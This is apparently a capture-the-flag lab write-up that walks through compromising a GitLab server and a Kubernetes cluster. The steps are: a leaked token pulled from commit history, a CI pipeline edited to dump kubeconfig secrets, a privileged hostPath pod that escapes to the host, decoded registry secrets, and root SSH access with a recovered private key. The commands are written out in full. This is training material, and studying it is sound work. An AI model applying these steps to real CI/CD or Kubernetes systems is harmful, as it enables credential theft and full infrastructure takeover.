# PipePoison Lab Writeup

### Overview

This writeup covers the exploitation of a multi-machine DevOps environment involving GitLab, Kubernetes, and CI/CD pipeline vulnerabilities. The challenge demonstrates real-world attack scenarios in modern containerized infrastructure.

### Initial Reconnaissance

We begin our assessment by performing network reconnaissance on both target machines to identify running services and potential attack vectors.

#### First Machine Scan - GitLab Server

```bash
nmap -sC -sV <machine-1-ip>
```
![secdojo](./images/gitlab-scan.png)

The nmap scan reveals the following open ports:

- **Port 22/tcp**: SSH service (OpenSSH 9.6p1)
- **Port 80/tcp**: HTTP service running nginx with GitLab

#### Second Machine Scan - Kubernetes Cluster

```bash
nmap -sC -sV <machine-2-ip>
```

The second machine reveals:

![secdojo](./images/k8s-scan.png)

- **Port 6443/tcp**: HTTPS service running Kubernetes API server
- SSL certificate shows Kubernetes-related Subject Alternative Names
- Service identified as Golang net/http server (typical for Kubernetes API)

### GitLab Access and Initial Exploration

#### Accessing the GitLab Instance

![secdojo](./images/gitlab-ui.png)

Navigating to `http://<machine-1-ip>` presents us with a GitLab login page. Importantly, we notice that user registration is enabled, allowing us to create our own account.

#### Repository Discovery

![secdojo](./images/public-repos.png)

After logging in, we explore the available projects and discover several repositories with different visibility levels:

##### Public Repositories

**1. devops-tools**
- **Visibility**: Public
- **Description**: Contains CI/CD pipeline configurations
- **Key Files**: `.gitlab-ci.yml`, deployment scripts

![secdojo](./images/devops-tools.png)

**2. docker-examples**  
- **Visibility**: Public
- **Description**: Contains Kubernetes examples and documentation
- **Key Files**: Various YAML configurations, comment files

![secdojo](./images/docker-example.png)

#### Analyzing docker-examples Repository

Initial examination of the docker-examples repository reveals:

**File: `k8s-examples/comment.txt`**

![secdojo](./images/comment-txt.png)

This comment provides valuable intelligence:
- References a **CI bot account** for deployments
- Mentions a **private k8s-deployments repository**
- Indicates **x-registry-bot** for registry access
- Suggests there are private repositories we need to access

#### Investigating devops-tools Repository

The devops-tools repository contains a GitLab CI/CD pipeline configuration that warrants closer inspection.


**Current `.gitlab-ci.yml` content:**
![secdojo](./images/devops-tools-pipeline.png)

#### Critical Discovery: Commit History Analysis

The current pipeline configuration shows `[REDACTED]` for the password, but this suggests credentials were previously exposed. Let's examine the commit history:


**Checking commit history:**
1. Navigate to the repository's commit history
2. Look for commits that modified `.gitlab-ci.yml`
3. Examine the diff to see what changed



**Key Finding in Commit History:**

![secdojo](./images/x-ci-bot-token.png)

In an earlier commit titled "Add initial CI configuration with build, test, and deploy stages", we discover the original pipeline contained:

```yaml
- docker login -u x-ci-bot -p "glpat-PVezhxFXH52kgNPu49oX" $CI_REGISTRY
```

**Extracted Token:** `glpat-PVezhxFXH52kgNPu49oX`

This represents a **GitLab Personal Access Token** which was accidentally committed and later "redacted" in a subsequent commit.

#### Verifying the Token

We first confirm that the token belongs to the `x-ci-bot` account by querying the GitLab API:

```bash
curl -H "PRIVATE-TOKEN: <ci-bot-token>" http://<gitlab-ip>/api/v4/user
```

![secdojo](./images/get-token-user.png)

The response confirms the token is associated with the `x-ci-bot` account, granting us access to its permissions and resources.

#### Enumerating Projects Accessible to x-ci-bot

To identify the projects the `x-ci-bot` account has access to, we query the GitLab API for a list of projects:

```bash
curl --header "PRIVATE-TOKEN: <ci-bot-token>" "http://<gitlab-ip>/api/v4/projects" | jq -r '.[] | .name'
```

![secdojo](./images/discover_k8s_depeloyments.png)

The `k8s-deployments` project is of particular interest, as it was referenced in the `comment.txt` file in the `docker-examples` repository as a private repository containing cluster configuration details.

#### Cloning the k8s-deployments Repository

Using the `x-ci-bot` credentials, we clone the private `k8s-deployments` repository to analyze its contents:

```bash
git clone http://x-ci-bot:<ci-bit-token>@<gitlab-ip>/root/k8s-deployments.git
```
![secdojo](./images/clone-k8s-dep.png)

The repository is successfully cloned, and we begin analyzing its contents.

#### Analyzing the k8s-deployments Repository

Inside the `k8s-deployments` repository, we find a `.gitlab-ci.yml` file that defines a CI/CD pipeline. The pipeline configuration is as follows:

**File: `.gitlab-ci.yml`**
```yaml
---
      stages:
        - deploy

      deploy_to_k8s:
        stage: deploy
        image: bitnami/kubectl:latest
        script:
          - mkdir -p ~/.kube
          - 'echo "$KUBE_CONFIG" > ~/.kube/config'
          - kubectl get pods -n ci-build
          - kubectl apply -f k8s/deployment.yaml
        only:
          - main
```

**Key Observations:**
- The pipeline includes a `deploy_job` that runs only on the `main` branch.
- The job uses a variable named `KUBECONFIG`.
- This suggests the `KUBECONFIG` variable contains sensitive Kubernetes cluster configuration details, likely including credentials for accessing the Kubernetes API server (port 6443, identified in the initial reconnaissance).

#### Triggering the Pipeline

So let's try to get the content of the `KUBECONFIG` varibale by adding this line in the script section
```bash
- 'echo "DEBUG: KUBE_CONFIG=$KUBE_CONFIG"'
```
Since the pipeline only runs on the `main` branch, but we are on the `master` branch, we modify the `.gitlab-ci.yml` file to trigger the pipeline on the `master` branch

**Updated `.gitlab-ci.yml`:**
```yaml
stages:
        - deploy

      deploy_to_k8s:
        stage: deploy
        image: bitnami/kubectl:latest
        script:
          - mkdir -p ~/.kube
          - 'echo "$KUBE_CONFIG" > ~/.kube/config'
          - 'echo "DEBUG: KUBE_CONFIG=$KUBE_CONFIG"'
          - kubectl get pods -n ci-build
          - kubectl apply -f k8s/deployment.yaml
        only:
          - master
```

**Commands to commit and push changes:**
```bash
git add .gitlab-ci.yml
git commit -m "trigger pipeline"
git push origin master
```

This triggers the pipeline on the `master` branch.

#### Capturing the Pipeline Output

To retrieve the `KUBECONFIG` variable from the pipeline's output, we need to extract the job trace. We use the following API calls to obtain the necessary IDs and the job trace:

1. **Find the project ID for k8s-deployments:**
```bash
curl --header "PRIVATE-TOKEN: <ci-bot-token>" "http://<gitlab-ip>/api/v4/projects?search=k8s-deployments" | jq -r '.[] | "\(.id) \(.name)"'
```

![secdojo](./images/get-project-id.png)

2. **Check the pipeline status and its ID:**
```bash
curl --header "PRIVATE-TOKEN: <ci-bot-token>" "http://<gitlab-ip>/api/v4/projects/<project-id>/pipelines" | jq -r '.[] | "\(.id) \(.status) \(.ref)"' | head -n 3
```

![secdojo](./images/get-pipeline-status-and-id.png)

We identify the pipeline ID `6` for the `master` branch.

3. **Find the job ID:**
```bash
curl --header "PRIVATE-TOKEN: <ci-bot-token>" "http://<gitlab-ip>/api/v4/projects/<project-id>/pipelines/<pipeline-id>/jobs" | jq -r '.[] | "\(.id) \(.name)"'
```

![secdojo](./images/get-job-id.png)

4. **Retrieve the job trace:**
```bash
curl --header "PRIVATE-TOKEN: <ci-bot-token" "http://<gitlab-ip>/api/v4/projects/<project-id>/jobs/<job-id>/trace"
```

**Output:**

![secdojo](./images/pipeline-output.png)

The job trace reveals the `KUBECONFIG` contents, including the Kubernetes API server endpoint (`https://<machine-2-ip>:6443`) and a Kubernetes token. This token can potentially be used to authenticate to the Kubernetes API server.

## Kubernetes Cluster Exploitation

### Using the Kubeconfig to Access the Kubernetes Cluster

With the `kubeconfig.yml` file extracted from the pipeline output, we can now communicate with the Kubernetes cluster on the second machine. Let's test the configuration:

```bash
KUBECONFIG=kubeconfig.yml kubectl get pods
```
![secdojo](./images/test-kubeconfig.png)

**Output:**
The command successfully lists the pods in the cluster, confirming that the `kubeconfig` credentials are valid for accessing the Kubernetes API server at `https://<machine-2-ip>:6443`.

### Creating a Privileged Pod

To gain deeper access, we create a privileged pod to potentially escalate privileges within the cluster. We define the following pod specification in `privpod.yml`:

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: pwn-pod
  namespace: ci-build
spec:
  hostPID: true
  containers:
  - name: pwn
    image: alpine
    securityContext:
      privileged: true
    command: ["/bin/sh"]
    args: ["-c", "sleep 3600"]
    volumeMounts:
    - mountPath: /host
      name: host-root
  volumes:
  - name: host-root
    hostPath:
      path: /
      type: Directory
```

We apply the pod configuration:

```bash
KUBECONFIG=kubeconfig.yml kubectl apply -f privpod.yml
```

**Output:**
```
pod/pwn-pod created
```

The pod is successfully created in the `ci-build` namespace.

### Executing into the Privileged Pod

With the pod running, we exec into it to explore the host filesystem:

```bash
KUBECONFIG=/tmp/kubeconfig.yml kubectl exec -it pwn-pod -n ci-build -- /bin/sh
```

![secdojo](./images/k8s-flag.png)


**Output:**

We gain a shell inside the pod. Navigating to the host root directory:

We find a `proof.txt` file, which contains the first root flag.
This confirms we have successfully escalated to root privileges on the host.

### Enumerating the Kubernetes Cluster

To further explore the cluster, we enumerate the secrets in the `ci-build` namespace:

```bash
KUBECONFIG=/tmp/kubeconfig.yml kubectl get secrets -n ci-build
```
![secdojo](./images/secrets.png)

We focus on the `gitlab-registry-secret`, which likely contains Docker registry credentials:

```bash
KUBECONFIG=/tmp/kubeconfig.yml kubectl get secret gitlab-registry-secret -o jsonpath="{.data.\.dockerconfigjson}" | base64 -d
```

![secdojo](./images/secrets-content.png)

This reveals the Docker registry credentials for the `x-registry-bot` account, including a GitLab Personal Access Token.

### Testing the Registry Token and Cloning Repositories

Using the `x-registry-bot` token, let's enumerate Projects accessible to x-registry-bot

![secdojo](./images/gitlab-bootsrap-reveal.png)

There is an interesting gitlab-bootsrap Projects

**Cloning the repository:**
```bash
git clone http://x-registry-bot:<registry-bot-token>@<gitlab-ip>/root/gitlab-bootstrap.git
```

**Analyzing the gitlab-bootstrap repository:**
Inside `playbooks`directory, we find `gitlab.yml` playbook that contains a private key:

![secdojo](./images/find-ssh-key.png)


We use the SSH private key to access the GitLab machine:

```bash
ssh -i git_key root@gitlab-ip>
```

**Output:**
After successful authentication, we navigate to the root directory and find the second flag:

![secdojo](./images/gitlab-flag.png)
